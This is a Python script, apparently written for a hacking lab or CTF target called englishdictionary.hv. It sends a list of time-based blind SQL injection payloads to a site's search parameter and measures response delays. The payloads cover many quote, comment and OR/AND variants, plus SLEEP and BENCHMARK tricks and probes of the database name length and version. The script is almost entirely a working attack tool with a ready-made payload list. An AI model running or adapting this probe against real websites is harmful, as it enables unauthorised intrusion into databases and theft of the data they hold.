#!/usr/bin/env python3
# sqli_payload_probe_fixed.py
# Try many time-based SQLi payload variants to detect filtering / different quoting/comment styles.
# Matches GET /?search=<payload> (englishdictionary.hv)

import requests, time, sys

BASE_URL = "http://englishdictionary.hv/"   # keep trailing slash
PARAM = "search"
SLEEP = 6
TIMEOUT = SLEEP + 4
THRESH = 4.5   # elapsed > THRESH considered true
HEADERS = {
    "User-Agent": "Mozilla/5.0 (X11; Linux x86_64)",
    "Accept": "text/html,application/xhtml+xml",
    "Connection": "keep-alive",
}

session = requests.Session()
session.headers.update(HEADERS)

payloads = [
    # basic SLEEP with single-quote and -- comment (our original)
    f"' AND IF(1=1,SLEEP({SLEEP}),0)-- -",
    # double quote
    f'" AND IF(1=1,SLEEP({SLEEP}),0)-- -',
    # hash comment
    f"' AND IF(1=1,SLEEP({SLEEP}),0)#",
    # inline comment
    f"' AND IF(1=1,SLEEP({SLEEP}),0)/*",
    # OR style
    f"' OR IF(1=1,SLEEP({SLEEP}),0)-- -",
    # short SLEEP alone (sometimes backend appends further logic)
    f"' AND SLEEP({SLEEP}) -- -",
    # wrapped ) or closing quote variants
    f"') AND IF(1=1,SLEEP({SLEEP}),0)-- -",
    f'") AND IF(1=1,SLEEP({SLEEP}),0)-- -',
    # BENCHMARK style to consume CPU instead of sleeping (MD5('a') safe inside f-string)
    f"' AND IF(1=1,BENCHMARK(800000,MD5('a')),0)-- -",
    # MySQL SLEEP inside OR (alternate structure)
    f"' OR SLEEP({SLEEP}) -- -",
    # URL-friendly plus signs (requests handles encoding but try explicit spaces)
    f"'+AND+IF(1=1,SLEEP({SLEEP}),0)--+-",
    # try quoting with backslash-escaped singlequote (less likely to be filtered)
    f"\\' AND IF(1=1,SLEEP({SLEEP}),0)-- -",
    # try testing LENGTH of database() the simple way to see it's accepted
    f"' AND IF(LENGTH(database())=1,SLEEP({SLEEP}),0)-- -",
    # try test on version()
    f"' AND IF(LENGTH(version())>0,SLEEP({SLEEP}),0)-- -",
]

def send(payload):
    params = {PARAM: payload}
    try:
        start = time.time()
        r = session.get(BASE_URL, params=params, timeout=TIMEOUT)
        elapsed = time.time() - start
        return elapsed, r
    except requests.exceptions.ReadTimeout:
        return TIMEOUT, None
    except requests.exceptions.RequestException as e:
        print(f"[!] Request error: {e}", file=sys.stderr)
        return 0.0, None

print(f"[*] Probing {len(payloads)} payload variants (SLEEP={SLEEP}s, THRESH={THRESH}s)\n")
results = []
for i, p in enumerate(payloads, 1):
    elapsed, resp = send(p)
    ok = elapsed > THRESH
    status = resp.status_code if resp is not None else "timeout/none"
    print(f"{i:02d}. {p[:80]:80} -> elapsed {elapsed:.2f}s -> {'TRUE' if ok else 'FALSE'} (status={status})")
    results.append((p, elapsed, ok, status))
    time.sleep(0.15)

# Summarize
true_found = [r for r in results if r[2]]
print("\n[*] Summary:")
if true_found:
    for p, elapsed, ok, status in true_found:
        print(f" [+] Variant produced delay: elapsed {elapsed:.2f}s -> {p}")
else:
    print(" [!] No payload variant produced a measurable delay.")

print("\n[*] Done. Next steps printed below.")
